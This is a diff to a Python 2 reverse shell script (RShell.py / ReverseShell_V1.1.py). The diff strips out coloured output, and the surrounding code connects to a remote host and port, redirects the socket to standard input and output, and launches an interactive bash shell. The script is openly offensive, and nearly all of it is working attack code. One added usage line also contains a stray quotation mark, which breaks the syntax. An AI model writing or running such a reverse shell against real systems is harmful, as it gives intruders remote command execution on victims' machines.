@@ -13,12 +13,14 @@ import socket
 import sys
 import os
 import subprocess
-from termcolor import*
+#from termcolor import*
 
 # Description
 if len(sys.argv) != 3: 
-	print(colored("Usage - ./RShell.py [REMOTE-SERVER] [PORT]",'yellow'))
-	print(colored("Example - ./RShell.py 195.168.3.67 80",'yellow'))
+	#print(colored("Usage - ./RShell.py [REMOTE-SERVER] [PORT]",'yellow'))
+	#print(colored("Example - ./RShell.py 195.168.3.67 80",'yellow'))
+	print "Usage - ./ReverseShell_V1.1.py [REMOTE-SERVER] [PORT]"
+	print "Usage - ./ReverseShell_V1.1.py" 8.8.8.8 22"
 	sys.exit()
 
 # Global Variables
@@ -35,7 +37,8 @@ def Reverse_Shell(r_Server, r_Port):
 		os.dup2(s.fileno(),2)   # Set here different Shell Envirioment
 		shell = subprocess.call(["/bin/bash", "-i"])
 	except Exception, e: # if Connection is Refused by Server
-		print (colored('[!] CONNECTION REFUSED! ','red')) + r_Server 
+		#print (colored('[!] CONNECTION REFUSED! ','red')) + r_Server
+		print "[!] CONNECTION REFUSED" + r_Server
 		sys.exit(1)
 Reverse_Shell(r_Server, r_Port)
 
